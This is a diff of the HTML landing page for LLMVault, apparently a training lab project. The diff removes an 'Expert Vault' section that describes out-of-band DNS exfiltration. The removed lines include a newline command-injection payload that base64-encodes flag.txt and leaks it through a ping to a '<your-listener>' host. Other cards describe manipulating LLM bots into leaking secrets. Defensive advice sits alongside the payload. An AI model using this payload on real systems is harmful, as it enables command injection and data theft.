@@ -313,7 +313,7 @@
 <body>
 <nav><div class="wrap">
   <div class="brand"><img src="https://raw.githubusercontent.com/CyberSunil/LLMVault/main/static/img/ui/logo.png" alt="LLMVault logo" class="logo-img"><span class="wordmark"><span class="b1">LLM</span><span class="b2">Vault</span></span></div>
-  <div class="navlinks"><a class="sec" href="#labs">Labs</a><a class="sec" href="#expert">Expert</a><a class="sec" href="#features">Features</a><a class="sec" href="#install">Install</a>
+  <div class="navlinks"><a class="sec" href="#labs">Labs</a><a class="sec" href="#features">Features</a><a class="sec" href="#install">Install</a>
     <button class="star" id="themeToggle" aria-label="Toggle light/dark theme" style="cursor:pointer;font-family:inherit">◐ Theme</button>
     <a class="star" href="https://github.com/CyberSunil/LLMVault">★ GitHub</a></div>
 </div></nav>
@@ -459,25 +459,6 @@
       <div class="card"><div class="id">LLM09 · 2026</div><h3>Misinformation</h3><p>Push a sycophantic bot into confidently fabricating and leaking a secret.</p></div>
       <div class="card"><div class="id">LLM10 · 2026</div><h3>Unbounded Consumption</h3><p>Trigger a denial-of-wallet condition that leaks internal state.</p></div>
     </div>
-  </section>
-
-  <section class="reveal" id="expert">
-    <h2>Expert Vault</h2>
-    <p class="sub">Five expert labs, shipped encrypted. One entry is public: out-of-band DNS exfiltration.</p>
-    <div class="grid">
-      <div class="card"><div class="id">EXPERT · OOB</div><h3>Out-of-Band DNS Exfiltration</h3><p>A blind uptime checker resolves and pings any hostname it is handed, then discards the command output. The hostname reaches a shell unfiltered, so a newline splits the ping from a second command. The flag never needs to come back in the response.</p></div>
-      <div class="card"><div class="id">EXPERT · CHANNEL</div><h3>Suppressed Output, Not Suppressed Data</h3><p>Every lookup the tool makes is a packet leaving the box. Encode the secret into DNS labels pointed at a listener you control, one label at a time, and read it from the resolver's query log. The tool still answers "Offline" the whole time.</p></div>
-      <div class="card"><div class="id">EXPERT · DEFENSE</div><h3>Break the Injection</h3><p>Pass the hostname as an argv array, never a shell string. Allowlist letters, digits, dot and hyphen; reject control characters including newlines. Egress-filter DNS from application servers and alert on high-volume lookups.</p></div>
-    </div>
-    <pre class="code"><span class="c"># the tool: raw hostname, shell, output thrown away</span>
-<span class="g">ping</span> -c 1 <span class="g">"$HOST"</span>
-
-<span class="c"># the bypass: a newline is a command separator too</span>
-127.0.0.1
-<span class="g">ping</span> -c 1 <span class="g">$(</span>base64 flag.txt | tr -d '='<span class="g">)</span>.&lt;your-listener&gt;
-
-<span class="c"># the read: the resolver carries it out; stdout stays empty</span></pre>
-    <p class="note"><strong>Why this is an expert lab:</strong> the output filter is working exactly as designed — the leak does not use it. Fixing the response is not fixing the injection.</p>
   </section>
 
   <section class="reveal" id="features">
